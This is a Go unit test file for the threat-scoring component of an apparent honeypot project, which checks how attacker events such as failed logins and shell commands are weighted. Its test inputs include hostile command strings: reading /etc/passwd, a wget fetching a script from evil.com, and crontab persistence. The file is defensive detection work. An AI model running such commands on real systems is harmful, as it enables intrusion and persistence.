/*
©AngelaMos | 2026
scorer_test.go
*/
package scoring

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"

	"github.com/CarterPerez-dev/hive/pkg/types"
)

func TestScoreEventAuth(t *testing.T) {
	ev := &types.Event{EventType: types.EventLoginFailed}
	assert.Equal(t, WeightAuthAttempt, ScoreEvent(ev))
}

func TestScoreEventDiscoveryCommand(t *testing.T) {
	ev := &types.Event{
		EventType:   types.EventCommand,
		ServiceData: json.RawMessage(`{"command":"cat /etc/passwd"}`),
	}
	assert.Equal(t, WeightDiscoveryCommand, ScoreEvent(ev))
}

func TestScoreEventToolTransfer(t *testing.T) {
	ev := &types.Event{
		EventType:   types.EventCommand,
		ServiceData: json.RawMessage(`{"command":"wget http://evil.com/bot.sh"}`),
	}
	assert.Equal(t, WeightToolTransfer, ScoreEvent(ev))
}

func TestScoreEventPersistence(t *testing.T) {
	ev := &types.Event{
		EventType:   types.EventCommand,
		ServiceData: json.RawMessage(`{"command":"crontab -e"}`),
	}
	assert.Equal(t, WeightPersistence, ScoreEvent(ev))
}

func TestScoreEventStackedCommand(t *testing.T) {
	ev := &types.Event{
		EventType: types.EventCommand,
		ServiceData: json.RawMessage(
			`{"command":"wget http://evil.com/x && crontab -e"}`,
		),
	}
	assert.Equal(t, WeightToolTransfer+WeightPersistence, ScoreEvent(ev))
}

func TestScoreEventFileUpload(t *testing.T) {
	ev := &types.Event{EventType: types.EventFileUpload}
	assert.Equal(t, WeightToolTransfer, ScoreEvent(ev))
}

func TestScoreEventUnrelated(t *testing.T) {
	ev := &types.Event{EventType: types.EventDisconnect}
	assert.Equal(t, 0, ScoreEvent(ev))
}

func TestCap(t *testing.T) {
	assert.Equal(t, MaxScore, Cap(150))
	assert.Equal(t, 0, Cap(-10))
	assert.Equal(t, 42, Cap(42))
}
